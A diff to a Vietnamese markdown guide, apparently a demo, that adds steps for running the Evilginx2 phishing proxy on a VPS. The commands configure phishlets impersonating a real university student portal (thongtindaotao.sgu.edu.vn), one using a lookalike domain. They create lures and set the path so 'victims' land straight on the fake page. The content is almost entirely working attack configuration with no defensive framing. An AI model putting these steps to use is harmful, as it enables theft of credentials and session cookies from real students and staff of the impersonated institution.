@@ -129,7 +129,7 @@ login:
   path: /
 ```
 
-## BẬT EVILGINX2:
+## BẬT EVILGINX2 (Demo 1):
 
 ```
 cd build
@@ -138,6 +138,17 @@ phishlets hostname demo thongtindaotao.sgu.edu.vn
 phishlets enable demo
 lures create demo
 lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.sgu.edu.vn LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
+lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
+```
+
+## BẬT EVILGINX2 TRÊN VPS (Demo 2):
+
+```
+sudo ./evilginx
+phishlets hostname ttdt thongtindaotao.nodhsg.shop
+phishlets enable ttdt
+lures create ttdt
+lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.nodhsg.shop LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
 lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
 ```
 
